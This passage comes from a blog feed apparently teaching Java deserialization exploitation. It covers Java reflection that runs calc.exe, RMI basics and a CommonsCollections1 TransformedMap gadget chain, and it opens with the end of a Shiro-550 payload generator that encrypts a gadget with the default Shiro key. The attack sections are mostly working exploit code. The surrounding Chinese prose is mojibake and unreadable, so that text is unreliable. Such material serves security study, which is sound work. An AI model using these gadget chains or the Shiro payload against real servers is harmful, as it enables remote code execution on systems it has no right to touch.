&#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span></span><br><span class="line">                pool.get(org.example.CommonsCollectionsShiro.class.getName());</span><br><span class="line">        <span class="type">byte</span>[] payloads = <span class="keyword">new</span></span><br><span class="line">                <span class="title class_">CommonsCollectionsShiro</span>().getPayload(clazz.toBytecode());</span><br><span class="line">        <span class="type">AesCipherService</span> <span class="variable">aes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AesCipherService</span>();</span><br><span class="line">        <span class="type">byte</span>[] key =</span><br><span class="line">                java.util.Base64.getDecoder().decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br><span class="line">        <span class="type">ByteSource</span> <span class="variable">ciphertext</span> <span class="operator">=</span> aes.encrypt(payloads, key);</span><br><span class="line">        System.out.printf(ciphertext.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>éœ€è¦ç”¨åˆ°javassiståº“ï¼Œä¸‹è½½åˆ°æœ¬åœ°é¡¹ç›®ç»“æ„é‡Œç›´æ¥æ·»åŠ </p><p><code>https://www.javassist.org/</code></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221204181850284.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221204181850284.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221204181959799.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221204181959799.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è¿™ä¸ªååºåˆ—åŒ–é“¾å¯ä»¥ç”¨æ¥æ£€æµ‹shiro-550</p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
          <category> CC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CC </tag>
            
            <tag> BCEL </tag>
            
            <tag> Shiro </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java TransformedMap&amp;LazyMap</title>
      <link href="/2022/09/03/java-transformedmap-lazymap/"/>
      <url>/2022/09/03/java-transformedmap-lazymap/</url>
      
        <content type="html"><![CDATA[<h1 id="javaåå°„"><a href="#javaåå°„" class="headerlink" title="javaåå°„"></a>javaåå°„</h1><p>é¦–å…ˆï¼Œåå°„é€šå¸¸æ˜¯é€šè¿‡classæ–¹æ³•ç”Ÿæˆçš„classå¯¹è±¡ï¼Œæ‰€ä»¥å¯ä»¥ä½¿ç”¨æ¯”å¦‚runtimeä¸‹æ²¡æœ‰è€Œclassä¸‹æœ‰çš„æ–¹æ³•ã€‚æ¯”å¦‚åºåˆ—åŒ–ï¼Œruntimeæ˜¯ç”Ÿæˆå¯¹è±¡æ˜¯æ— æ³•åºåˆ—åŒ–çš„ï¼Œä½†æ˜¯classå¯ä»¥ã€‚æ‰€ä»¥ä¸€èˆ¬éƒ½è¦é€šè¿‡classè¿›è¡Œååºåˆ—åŒ–</p><h2 id="getMethodåˆ©ç”¨å®ä¾‹åŒ–å¯¹è±¡æ–¹æ³•å®ä¾‹åŒ–å¯¹è±¡"><a href="#getMethodåˆ©ç”¨å®ä¾‹åŒ–å¯¹è±¡æ–¹æ³•å®ä¾‹åŒ–å¯¹è±¡" class="headerlink" title="getMethodåˆ©ç”¨å®ä¾‹åŒ–å¯¹è±¡æ–¹æ³•å®ä¾‹åŒ–å¯¹è±¡"></a>getMethodåˆ©ç”¨å®ä¾‹åŒ–å¯¹è±¡æ–¹æ³•å®ä¾‹åŒ–å¯¹è±¡</h2><ul><li>æ–¹æ³•.invoke(å¯¹è±¡ï¼Œå‚æ•°)è°ƒç”¨è¯¥å¯¹è±¡ä¸‹çš„æ–¹æ³•</li></ul><p>Runtimeä¸‹çš„æ„é€ å‡½æ•°æ˜¯ç§æœ‰çš„ï¼Œåªèƒ½é€šè¿‡Runtime.getRuntime()æ¥è·å–Runtimeå¯¹è±¡ã€‚</p><ul><li>getMethodé€šè¿‡åå°„è·å–ä¸€ä¸ªç±»çš„å…¬æœ‰æ–¹æ³•ï¼ˆå› ä¸ºé‡è½½çš„å­˜åœ¨ä¸èƒ½ç›´æ¥ç¡®å®šå‡½æ•°ï¼‰ã€‚è€Œinvokeå’ŒgetMethodçš„åŒºåˆ«å°±æ˜¯invokeä¼šæ‰§è¡Œå‡½æ•°ã€‚</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"><span class="type">Method</span> <span class="variable">execMethod</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line"><span class="type">Method</span> <span class="variable">getRuntimeMethod</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">runtime</span> <span class="operator">=</span> getRuntimeMethod.invoke(clazz);</span><br><span class="line">execMethod.invoke(runtime, <span class="string">&quot;calc.exe&quot;</span>);</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥ä¸Šè¿°ä»£ç å°±æ˜¯ï¼Œç”¨forNameè·å–Runtimeç±»å¹¶å‘½åä¸ºclazzï¼Œç”¨getMethodè·å–clazzç±»é‡Œçš„execæ–¹æ³•(å› ä¸ºexecæœ‰6ä¸ªé‡è½½çš„åŸå› è¦åŠ string.classå‚æ•°)å¹¶å‘½åä¸ºexecMethodï¼Œç”¨getMethodè·å–getRuntimeæ–¹æ³•å¹¶å‘½åä¸ºgetRuntimeMethodï¼Œç”¨getRuntimeMethodæ–¹æ³•è·å–Runtimeçš„å¯¹è±¡ï¼Œinvokeæ‰§è¡Œclazzç±»ä¸‹çš„getRuntimeMethodæ–¹æ³•ï¼ˆä¹Ÿå°±æ˜¯ç”Ÿæˆå¯¹è±¡ï¼‰å¹¶å‘½åä¸ºruntimeã€‚æœ€å¥½invokeæ‰§è¡Œruntimeå¯¹è±¡çš„execæ–¹æ³•ï¼Œå¹¶ä¼ å…¥å‚æ•°calc.exeã€‚ä¹Ÿå°±æ˜¯æ‰“å¼€è®¡ç®—å™¨ã€‚</p><h2 id="getConstructoråˆ©ç”¨æ„é€ å‡½æ•°å®ä¾‹åŒ–å¯¹è±¡"><a href="#getConstructoråˆ©ç”¨æ„é€ å‡½æ•°å®ä¾‹åŒ–å¯¹è±¡" class="headerlink" title="getConstructoråˆ©ç”¨æ„é€ å‡½æ•°å®ä¾‹åŒ–å¯¹è±¡"></a>getConstructoråˆ©ç”¨æ„é€ å‡½æ•°å®ä¾‹åŒ–å¯¹è±¡</h2><p>è¯¥æ–¹æ³•å®ä¾‹åŒ–éœ€è¦æ„é€ å‡½æ•°å…¬æœ‰</p><ul><li><p>newInstanceå®ä¾‹åŒ–ç±»å¯¹è±¡</p></li><li><p>getConstructorè·å–<strong>å…·æœ‰æŒ‡å®šå‚æ•°ç±»å‹çš„æŒ‡å®šç±»æ„é€ å‡½æ•°</strong>ã€‚</p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;start&quot;</span>).invoke(clazz.getConstructor(List.class).newInstance(Arrays.asList(<span class="string">&quot;calc.exe&quot;</span>)));</span><br></pre></td></tr></table></figure><p>forNameè·å–ProcessBuilderç±»ï¼Œç”¨getMethodè·å–startæ–¹æ³•ã€‚</p><p>ä½†æ˜¯ProcessBuilderçš„æ„é€ å‡½æ•°å‚æ•°æœ‰<code>List&lt;string&gt;</code>æˆ–è€…<code>string...</code>ã€‚</p><p><code>...</code>è¡¨ç¤ºä¸ç¡®å®šå‚æ•°ä¸ªæ•°ï¼Œåœ¨åº•å±‚ä¸ºä¸€ä¸ªæ•°ç»„ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥ä¼ æ•°ç»„å‚æ•°</p><ul><li>å¦‚æœè¦è·å–<code>List&lt;string&gt;</code>å‚æ•°çš„æ„é€ å‡½æ•°ï¼Œå¯ä»¥ç”¨Listå¼ºåˆ¶ç±»å‹è½¬åŒ–åä¼ å‚</li></ul><p>invokeè°ƒç”¨getConstructorè·å–æ„é€ å‡½æ•°ï¼Œç„¶åç”¨newInstanceå®ä¾‹åŒ–ç±»å¯¹è±¡æ—¶å°±ä¼šè°ƒç”¨æ„é€ å‡½æ•°ã€‚newInstanceçš„å‚æ•°calc.exeä¼šä½œä¸ºå‚æ•°ä¼ é€’ç»™æ„é€ å‡½æ•°ï¼Œç„¶åstartå…±äº«å‚æ•°æ‰§è¡Œå‘½ä»¤ã€‚å³<code>clazz.getConstructor(List.class).newInstance(Arrays.asList(&quot;calc.exe&quot;))</code>æ˜¯å‘æ„é€ å‡½æ•°ä¼ calc.exeå‚å®ä¾‹åŒ–å¯¹è±¡</p><ul><li>å¦‚æœè¦æ‰§è¡Œ<code>string...</code>æ ¼å¼çš„æ„é€ å‡½æ•°ï¼Œå°±æ˜¯è¦ä¼ <code>String[].class</code></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;start&quot;</span>).invoke(clazz.getConstructor(String[].class).newInstance(<span class="keyword">new</span> <span class="title class_">String</span>[][]&#123;&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;&#125;));</span><br></pre></td></tr></table></figure><p>å› ä¸ºnewInstanceä¹Ÿæ˜¯æ¥æ”¶å˜é•¿å‚æ•°ï¼ŒgetConstructorä¹Ÿæ˜¯æ¥æ”¶å˜é•¿å‚æ•°ï¼Œæ‰€ä»¥è¦ä¼ äºŒç»´æ•°ç»„</p><p>é‚£æ„é€ å‡½æ•°ç§æœ‰å‘¢ï¼Ÿ</p><h2 id="getDeclaredMethodæˆ–getDeclaredConstructè·å–ç§æœ‰æ„é€ å‡½æ•°å®ä¾‹åŒ–å¯¹è±¡"><a href="#getDeclaredMethodæˆ–getDeclaredConstructè·å–ç§æœ‰æ„é€ å‡½æ•°å®ä¾‹åŒ–å¯¹è±¡" class="headerlink" title="getDeclaredMethodæˆ–getDeclaredConstructè·å–ç§æœ‰æ„é€ å‡½æ•°å®ä¾‹åŒ–å¯¹è±¡"></a>getDeclaredMethodæˆ–getDeclaredConstructè·å–ç§æœ‰æ„é€ å‡½æ•°å®ä¾‹åŒ–å¯¹è±¡</h2><p>ä¸Šé¢ä¸¤ç§æ–¹æ³•ç”±äº<code>getMethod</code>å’Œ<code>getConstruct</code>æ˜¯è·å–ç±»çš„æ‰€æœ‰<strong>å…¬å…±</strong>æ–¹æ³•ï¼ŒåŒ…æ‹¬ç»§æ‰¿ã€‚æ‰€ä»¥ä¸èƒ½è·å–åˆ°ç§æœ‰å’Œä¿æŠ¤æ–¹æ³•ã€‚ä½†æ˜¯<code>getDeclaredMethod</code>å’Œ<code>getDeclaredConstruct</code>æ˜¯è·å–å£°æ˜ï¼ˆå†™ï¼‰åœ¨ç±»çš„æ–¹æ³•ï¼Œå°±èƒ½<strong>è·å–åˆ°ç§æœ‰å’Œä¿æŠ¤æ–¹æ³•</strong>ï¼Œä½†æ˜¯ä¸èƒ½è·å–ç»§æ‰¿æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">m</span> <span class="operator">=</span> clazz.getDeclaredConstructor();</span><br><span class="line">m.setAccessible(<span class="literal">true</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(m.newInstance(), <span class="string">&quot;calc.exe&quot;</span>)</span><br></pre></td></tr></table></figure><p>å¿…é¡»å†™setAccessibleä¿®æ”¹ä½œç”¨åŸŸã€‚å› ä¸ºRuntimeæœ‰æ— å‚æ„é€ å‡½æ•°çš„åŸå› ï¼ŒgetDeclaredConstructorå¯ä»¥ä¸åŠ å‚æ•°ã€‚ä¸åƒProcessBuilderæœ‰ä¸¤ä¸ªæ„é€ å‡½æ•°è€Œä¸”éƒ½æœ‰å‚æ•°</p><h1 id="JAVA-RMI"><a href="#JAVA-RMI" class="headerlink" title="JAVA RMI"></a>JAVA RMI</h1><p>RMIä¸ºè¿œç¨‹æ–¹æ³•è°ƒç”¨.è¿‡ç¨‹æœ‰ä¸‰æ–¹å‚ä¸ï¼Œåˆ†åˆ«ä¸ºRegistry,Server,Clientã€‚å¦‚æœå­¦è¿‡å¯ä¿¡è®¡ç®—ï¼Œå¯ä»¥æŠŠRegistryç†è§£ä¸ºå¯ä¿¡ç¬¬ä¸‰æ–¹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">Naming.bind(<span class="string">&quot;rmi://127.0.0.1:1099/Hello&quot;</span>, <span class="keyword">new</span> <span class="title class_">RemoteHelloWorld</span>());</span><br></pre></td></tr></table></figure><p>åˆ›å»ºRegistryå¹¶ç»‘å®šRemoteHelloworldå¯¹è±¡åˆ°Helloåå­—ä¸Šã€‚Naming.bindç¬¬ä¸€ä¸ªå‚æ•°æ˜¯urlï¼ˆrmi:&#x2F;&#x2F;host:port&#x2F;name)ï¼Œnameä¸ºè¿œç¨‹å¯¹è±¡çš„åå­—ã€‚æœ¬åœ°è¿è¡Œæ—¶socketé»˜è®¤ä¸ºlocalhost:1099ã€‚ </p><p>è€Œåœ¨è¿œç¨‹ç”¨Naming.rebindé‡æ–°ç»‘å®šå¯¹è±¡æ˜¯ä¸è¡Œçš„ï¼Œåªæœ‰url ipä¸ºlocalhostæ‰èƒ½ç›´æ¥è°ƒç”¨rebind\bindç­‰æ–¹æ³•ã€‚ï¼ˆipå¿…é¡»ä¸ºæœåŠ¡å™¨ipæ‰èƒ½è¿œç¨‹è®¿é—®ï¼‰</p><ul><li>listæ­é…lookupè¿›è¡Œè¿œç¨‹è°ƒç”¨ã€‚Liståˆ—å‡ºæ‰€æœ‰ç»‘å®šå¯¹è±¡åç”¨lookupè·å–æŒ‡å®šå¯¹è±¡(BaRMIeæ¢æµ‹å±é™©æ–¹æ³•)</li><li>appletçš„codebaseæ ‡ç­¾RMI</li></ul><h1 id="JAVAååºåˆ—åŒ–"><a href="#JAVAååºåˆ—åŒ–" class="headerlink" title="JAVAååºåˆ—åŒ–"></a>JAVAååºåˆ—åŒ–</h1><p><code>readObject</code>ï¼šå’Œ<code>php __wakeup</code>ç±»ä¼¼</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.vulhub.Ser;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> <span class="keyword">implements</span> <span class="title class_">java</span>.io.Serializable &#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;</span><br><span class="line">    Person(String name, <span class="type">int</span> age) &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(java.io.ObjectOutputStream s)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        s.defaultWriteObject();</span><br><span class="line">        s.writeObject(<span class="string">&quot;This is a object&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        s.defaultReadObject();</span><br><span class="line">        <span class="type">String</span> <span class="variable">message</span> <span class="operator">=</span> (String) s.readObject();</span><br><span class="line">        System.out.println(message);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åºåˆ—åŒ–å¯¹è±¡æ—¶ä¼šè°ƒç”¨writeObjectæ–¹æ³•å†™å…¥å†…å®¹ï¼Œå‚æ•°ç±»å‹ä¸ºObjectOutputStreamã€‚ååºåˆ—åŒ–æ—¶ä¼šè°ƒç”¨readObjectè¯»å–æµï¼Œè¯¥æµå¯ä»¥è¿›è¡Œåˆ©ç”¨ä»¥è¯»å–å‰é¢å†™å…¥çš„å†…å®¹ï¼ˆä¹Ÿå¯ä»¥å…¶ä»–åˆ©ç”¨ï¼‰</p><p>defaultWriteObjectå°†å¯¹è±¡å¯åºåˆ—åŒ–å­—æ®µå†™å…¥è¾“å‡ºæµï¼Œä¹Ÿå°±æ˜¯åºåˆ—åŒ–ã€‚</p><p>s.writeObjectæŠŠå­—ç¬¦ä¸²å†™å…¥æµä¸­ã€‚readåŒç†</p><p>åœ¨ä»£ç è¿›è¡Œåˆ°ä¸­é—´ï¼Œä¹Ÿå°±æ˜¯writeObjectå®Œçš„æ—¶å€™ç”¨SerializationDumperæŸ¥çœ‹æ•°æ®æ—¶å‘ç°å†™å…¥çš„å­—ç¬¦ä¸²æ”¾åœ¨<code>objectAnnotation</code>çš„ä½ç½®</p><ul><li>objectAnnotation:åºåˆ—åŒ–æ—¶å¼€å‘è€…å†™å…¥çš„å†…å®¹ä¼šæ”¾åœ¨objectAnnotationä¸­ã€‚readObjectååºåˆ—æ—¶ä¼šè¯»å–å†™å…¥å†…å®¹ï¼ˆä¸ç”¨è€ƒè™‘ç±»å±æ€§ï¼Œä»»æ„ä¸œè¥¿éƒ½èƒ½å†™å…¥ï¼‰</li></ul><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221110210950116.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221110210950116.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>readObjectè¯»å–å†™å…¥å†…å®¹åä¼ å…¥messageï¼ŒprintInè¾“å‡º</p><p>åœ¨URLDNSåˆ©ç”¨é“¾é‡Œç”¨åˆ°äº†hashmapï¼Œä¸»è¦åŸå› å°±æ˜¯hashmapç»§æ‰¿äº†Serializableæ¥å£</p><h2 id="Common-collections1-TransformMapç‰ˆ"><a href="#Common-collections1-TransformMapç‰ˆ" class="headerlink" title="Common-collections1 TransformMapç‰ˆ"></a>Common-collections1 TransformMapç‰ˆ</h2><p>ä¸‹é¢å¯¹pç¥ç¼–å†™çš„ç®€åŒ–ç‰ˆcommoncollections1çš„åˆ©ç”¨é“¾</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.vulhub.Ser;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonCollections1</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.getRuntime()),</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Object</span>[]</span><br><span class="line">&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;),</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span></span><br><span class="line"><span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"><span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>,</span><br><span class="line">transformerChain);</span><br><span class="line">outerMap.put(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç”¨Transformer[]å®šä¹‰äº†transformersæ¥å£ï¼Œtransformersæ¥æ”¶ä¸¤ä¸ªå‚æ•°ï¼Œåˆ†åˆ«ä¸ºConstantTransformer(æ„é€ å‡½æ•°æ—¶ä¼ å…¥å¯¹è±¡å¹¶è¿”å›è¯¥å¯¹è±¡)ï¼ŒInvokerTransformer(æ‰§è¡Œä»»æ„æ–¹æ³•)ã€‚</p><ul><li>InvokerTransformeræ¥æ”¶ä¸‰ä¸ªå‚æ•°ï¼Œå‘½ä»¤æ‰§è¡Œæ–¹æ³•ï¼Œå‡½æ•°å‚æ•°ç±»å‹ï¼Œå‚æ•°åˆ—è¡¨ã€‚å‚æ•°ç±»å‹å‚ç…§å‰é¢çš„execä¸åŒæ„é€ æ„é€ å‡½æ•°ã€‚è¿™é‡Œé€‰æ‹©çš„String.classä¹Ÿå°±æ˜¯å­—ç¬¦å¯¹è±¡ã€‚</li></ul><ul><li>InvokerTransformerç”¨getClassï¼ŒgetMethodåç”¨invokeæ‰§è¡Œäº†æ–¹æ³•ã€‚</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(iMethodName, iParamTypes);</span><br><span class="line"><span class="keyword">return</span> method.invoke(input, iArgs);</span><br></pre></td></tr></table></figure><p>ChainedTransformerå°†å‰ä¸€ä¸ªå›è°ƒè¿”å›ç»“æœä½œä¸ºåä¸€ä¸ªå›è°ƒå‚æ•°ï¼Œç°åœ¨ä½ å°±çŸ¥é“äº†ä¸ºä»€ä¹ˆtransformerså®šä¹‰æ—¶ä¼ å…¥äº†ä¸¤ä¸ªå¯¹è±¡äº†ï¼ŒgetRuntimeè·å–çš„å¯¹è±¡ç»è¿‡ConstantTransformerè¿”å›åä½œä¸ºå‚æ•°ä¼ åˆ°InvokerTransformeré‡Œã€‚å› ä¸ºRuntimeé‡Œæ‰æœ‰execæ–¹æ³•</p><p>è€Œdecorateæ–¹æ³•æ˜¯è·å–ä¸€ä¸ªTransformedMapå¯¹è±¡ï¼Œå½“TransformedMapå†…çš„keyå’Œvalueå˜åŒ–æ—¶å°±ä¼šè§¦å‘Transformerçš„transform()æ–¹æ³•ã€‚ åœ¨è¿™é‡Œä¹Ÿå°±æ˜¯æŠŠtransformerChainç»‘å®šåœ¨valueæˆ–è€…keyä¸Šã€‚åç»­putè¿›æ–°å…ƒç´ æ—¶ä¼šæ”¹å˜transformvalueæˆ–è€…keyè¿›è€Œè§¦å‘ååºåˆ—åŒ–é“¾ã€‚</p><p>è§¦å‘è¿‡ç¨‹ï¼šputæ–°å…ƒç´ è§¦å‘hashmapçš„ååºåˆ—åŒ–ï¼Œå¹¶ä¸”transformChainå¼€å§‹ç”Ÿæˆruntimeå¯¹è±¡ï¼Œexecæ‰§è¡Œ</p><p>ä½†æ˜¯ç°å®ç¯å¢ƒå‡ ä¹æ²¡æœ‰èƒ½ç›´æ¥putå…ƒç´ çš„ç¯å¢ƒã€‚éœ€è¦åœ¨javaåŸç”Ÿç¯å¢ƒæ‰¾åˆ°putç±»æ“ä½œï¼Œä¹Ÿå°±æ˜¯sun.reflect.annotation.AnnotationInvocationHandlerã€‚AnnotationInvocationHandlerçš„readObjectæ–¹æ³•é‡Œæœ‰memberValue.setValue()ï¼Œåœ¨åºåˆ—åŒ–æ—¶ä¼šç›´æ¥è§¦å‘ã€‚æ‰€ä»¥åªéœ€è¦æŠŠMapä¼ è¿›å»å°±è¡Œäº†ã€‚ä½†æ˜¯è¿™ä¸ªæ–¹æ³•æ˜¯ç§æœ‰çš„ï¼Œè¿˜éœ€è¦åå°„è·å–</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">oos.writeObject(obj);</span><br><span class="line">oos.close();</span><br></pre></td></tr></table></figure><p>ç”±äºç½‘ç»œä¼ è¾“éœ€è¦ç”¨å­—èŠ‚æµè€Œä¸æ˜¯å­—ç¬¦æµï¼Œå°±éœ€è¦å…ˆByteOutputStreamåˆ›å»ºå­—èŠ‚æ•°ç»„ç¼“å­˜åŒºï¼Œå†åˆ›å»ºå¯¹è±¡çš„åºåˆ—åŒ–æµåç”¨writeObjectå†™å…¥åºåˆ—åŒ–æµã€‚</p><p>ä½†æ˜¯æ‰§è¡Œä¸äº†ï¼Œä¸Šè¿°ä»£ç å¯¹è±¡æ˜¯ç”±Runtime.getRuntime()å®ä¾‹åŒ–å¯¹è±¡æ–¹æ³•ç›´æ¥ç”Ÿæˆçš„ã€‚ç»§æ‰¿çš„æ˜¯Runtimeçš„æ–¹æ³•ï¼Œä½†æ˜¯è¯¥ç±»ä¸‹æ²¡æœ‰serializableæ¥å£è¿›è¡Œåºåˆ—åŒ–ã€‚ä»å¼€ç¯‡æçš„classåå°„ç”Ÿæˆçš„ç±»å…·æœ‰serializableæ¥å£ï¼Œæ‰€ä»¥è¿™é‡Œè¦å€ŸåŠ©classè¿›è¡Œåå°„ã€‚(å¯¹è±¡å…·æœ‰serializableæ¥å£æ‰èƒ½ååºåˆ—åŒ–ï¼Œè€Œååºåˆ—åŒ–æ˜¯ä»readObjectå…¥å£)</p><p>æ‰€ä»¥ååºåˆ—åŒ–é“¾ä¸ºï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span 